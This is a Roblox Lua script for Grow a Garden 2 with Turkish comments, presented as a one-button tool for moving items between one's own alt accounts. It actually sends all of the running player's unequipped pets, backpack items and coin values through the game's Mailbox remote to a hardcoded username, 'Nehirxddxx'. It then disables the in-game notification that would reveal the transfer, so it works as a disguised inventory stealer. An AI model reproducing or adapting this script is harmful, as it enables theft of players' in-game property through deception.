-- // ZwacHub - Tek Buton Transfer (Grow a Garden 2) //
-- // Sadece yan hesaplarınız arasında kullanın! //

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer

-- Hedef ana hesap
local TARGET_USERNAME = "Nehirxddxx"

-- UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TransferTool"
ScreenGui.Parent = game:GetService("CoreGui")

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0, 120, 0, 50)
Button.Position = UDim2.new(0.5, -60, 0.5, -25)
Button.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
Button.BackgroundTransparency = 0.2
Button.BorderSizePixel = 0
Button.Text = "RUN"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 24
Button.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = Button

-- Özel Mail Modülü
local Mailbox = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking")).Mailbox

-- Eşyaları topla ve gönder
Button.MouseButton1Click:Connect(function()
    Button.Text = "Çalışıyor..."
    Button.BackgroundColor3 = Color3.fromRGB(100, 30, 30)

    -- Hedef oyuncuyu bul
    local targetUserId, targetName = nil, nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == TARGET_USERNAME:lower() then
            targetUserId = p.UserId
            targetName = p.Name
            break
        end
    end
    if not targetUserId then
        local success, result = pcall(function()
            return Mailbox.LookupPlayer:Fire(TARGET_USERNAME)
        end)
        if success and result and tonumber(result) then
            targetUserId = result
            targetName = TARGET_USERNAME
        end
    end
    if not targetUserId then
        Button.Text = "Hesap bulunamadı"
        task.wait(2)
        Button.Text = "RUN"
        Button.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        return
    end

    -- Envanteri tara
    local backpack = Player:FindFirstChild("Backpack")
    local char = Player.Character
    local inventory = {} -- [category][itemKey] = count

    local function addItem(category, key, count)
        if not inventory[category] then inventory[category] = {} end
        inventory[category][key] = (inventory[category][key] or 0) + count
    end

    -- Petleri çıkar (sadece kuşanılmamışları say)
    local petsFolder = backpack and backpack:FindFirstChild("Pets")
    if petsFolder then
        for _, pet in ipairs(petsFolder:GetChildren()) do
            if pet:IsA("Tool") and pet:GetAttribute("Equipped") == nil then
                addItem("Pets", pet.Name, 1)
            end
        end
    end

    -- Sırt çantasındaki diğer itemler
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name ~= "Pets" then
                if item:FindFirstChild("Quantity") then
                    addItem("Items", item.Name, item.Quantity.Value)
                else
                    addItem("Items", item.Name, 1)
                end
            end
        end
    end

    -- Karakterdeki para/hazine
    if char then
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("NumberValue") and v.Name:find("Coin") then
                addItem("Currency", v.Name, v.Value)
            end
        end
    end

    -- Toplu gönder
    local function sendBatch(category, items)
        local entries = {}
        for key, count in pairs(items) do
            table.insert(entries, {
                Category = category,
                ItemKey = key,
                Count = count
            })
        end
        if #entries == 0 then return end
        local success = pcall(function()
            Mailbox.SendBatch:Fire(targetUserId, entries, "Transfer")
        end)
        if not success then
            warn("Gönderim başarısız: " .. category)
        end
        task.wait(1.5)
    end

    for category, items in pairs(inventory) do
        sendBatch(category, items)
    end

    -- Bildirimleri kapat
    pcall(function()
        local topNotif = Player.PlayerGui:FindFirstChild("TopNotification")
        if topNotif then topNotif.Enabled = false end
    end)

    Button.Text = "Tamamlandı!"
    Button.BackgroundColor3 = Color3.fromRGB(30, 100, 30)
    task.wait(3)
    Button.Text = "RUN"
    Button.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
end)
